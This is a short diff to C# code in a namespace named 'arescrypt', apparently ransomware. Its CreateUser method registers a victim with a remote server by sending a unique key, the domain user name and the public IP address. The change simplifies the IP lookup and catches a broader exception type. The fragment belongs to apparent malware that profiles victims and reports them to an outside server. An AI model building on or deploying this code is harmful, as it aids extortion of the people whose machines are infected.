@@ -30,9 +30,7 @@ namespace arescrypt
 
         public bool CreateUser()
         {
-            JToken IPInfo = JObject.Parse(Miscellaneous.GetPublicIPAddress());
-            string userIPAddr = (string)IPInfo.SelectToken("ip");
-                       
+            string userIPAddr = Miscellaneous.GetPublicIPAddress();
             string userParams = "uniqueKey=" + userData.getUniqueKey() +
                 "&userDomUser=" + Configuration.userDomUser +
                 "&userIPAddr=" + userIPAddr +
@@ -48,7 +46,7 @@ namespace arescrypt
 
                     JToken jsonObject = JObject.Parse(response);
                     return (bool)jsonObject.SelectToken("creationSuccess");
-                } catch (WebException exc)
+                } catch (Exception exc)
                 { Console.WriteLine("Caught exception: " + exc.Message); return false; }
             }
         }
